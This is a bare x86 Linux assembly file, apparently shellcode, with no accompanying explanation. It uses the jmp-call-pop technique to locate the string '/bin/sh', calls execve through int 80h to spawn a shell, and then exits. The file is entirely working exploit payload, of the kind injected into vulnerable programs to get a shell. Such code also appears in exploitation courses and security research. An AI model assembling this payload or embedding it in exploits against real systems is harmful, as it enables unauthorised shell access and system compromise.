section .text
	global _start

_start:
	jmp tothesh
main:
	mov eax, 11
	pop ebx
	push 0x0
	push ebx
	mov ecx, esp
	xor edx, edx

	int 80h
	mov eax, 1
	int 80h

tothesh:
	call main
	db '/bin/sh'
